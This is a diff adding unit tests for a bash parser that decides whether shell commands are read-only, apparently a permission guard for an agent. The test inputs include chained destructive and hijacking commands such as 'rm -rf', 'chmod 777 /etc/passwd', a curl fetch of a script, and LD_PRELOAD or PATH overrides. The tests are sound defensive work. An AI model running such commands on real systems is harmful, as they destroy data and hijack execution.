@@ -282,6 +282,92 @@ class BashParserReadOnlyTest(IsolatedAsyncioTestCase):
                     f"Expected '{cmd}' to be non-read-only",
                 )
 
+    async def test_background_and_newline_compounds_are_not_read_only(
+        self,
+    ) -> None:
+        """Test separators other than &&/||/;/| also split subcommands."""
+        compound_commands = [
+            "ls & rm -rf /tmp/pwn",
+            "ls -la&rm -rf /tmp/pwn",
+            "ls\nrm -rf /tmp/pwn",
+            "ls\r\nrm -rf /tmp/pwn",
+            "ls\n\nrm -rf /tmp/pwn",
+            "ls &\nrm -rf /tmp/pwn",
+            "cat file.txt\nchmod 777 /etc/passwd",
+            "git status\ncurl http://example.com/x.sh",
+        ]
+        for cmd in compound_commands:
+            with self.subTest(cmd=cmd):
+                self.assertFalse(
+                    self.parser.is_read_only_command(cmd),
+                    f"Expected '{cmd}' to be non-read-only",
+                )
+
+    async def test_non_command_statements_are_not_read_only(self) -> None:
+        """Test statements that are not plain commands fail closed."""
+        commands = [
+            "ls\nexport PATH=/tmp/evil",
+            "ls\nPATH=/tmp/evil",
+            "ls\nPATH=/tmp/evil\nls",
+            "ls\nunset PATH",
+            "ls\ndeclare -x PATH=/tmp/evil\nls",
+            "ls\nreadonly PATH=/tmp/evil",
+            "PATH=/tmp/evil && ls",
+        ]
+        for cmd in commands:
+            with self.subTest(cmd=cmd):
+                self.assertFalse(
+                    self.parser.is_read_only_command(cmd),
+                    f"Expected '{cmd}' to be non-read-only",
+                )
+
+    async def test_split_keeps_non_command_statements(self) -> None:
+        """Test the split returns statements that are not plain commands."""
+        command = "ls\nPATH=/tmp/evil\nls"
+        tree = self.parser.parser.parse(bytes(command, "utf8"))
+        self.assertListEqual(
+            self.parser.split_compound_command(tree.root_node, command),
+            ["ls", "PATH=/tmp/evil", "ls"],
+        )
+
+    async def test_leading_assignment_is_not_read_only(self) -> None:
+        """Test an inline assignment prefix fails closed."""
+        commands = [
+            "PATH=/tmp/evil ls",
+            "LD_PRELOAD=/tmp/evil.so ls",
+            "BASH_ENV=/tmp/evil ls",
+            "LD_LIBRARY_PATH=/tmp/evil cat file.txt",
+            "IFS=. NODE_ENV=prod git status",
+        ]
+        for cmd in commands:
+            with self.subTest(cmd=cmd):
+                self.assertFalse(
+                    self.parser.is_read_only_command(cmd),
+                    f"Expected '{cmd}' to be non-read-only",
+                )
+
+    async def test_read_only_subcommands_stay_read_only(self) -> None:
+        """Test the extra separators keep read-only sequences read-only."""
+        read_only_commands = [
+            "ls &",
+            "echo a=b",
+            "grep 'k=v' file.txt",
+            "ls\ncat file.txt",
+            "echo a\necho b",
+            "git status\ngit log",
+            "ls # comment",
+            "ls\n# comment\ncat file.txt",
+            "cat < input.txt",
+            "cat <<EOF\nhello\nEOF",
+            "! ls",
+        ]
+        for cmd in read_only_commands:
+            with self.subTest(cmd=cmd):
+                self.assertTrue(
+                    self.parser.is_read_only_command(cmd),
+                    f"Expected '{cmd}' to be read-only",
+                )
+
     async def test_single_read_only_docker_commands(self) -> None:
         """Test single read-only docker commands."""
         read_only_commands = [
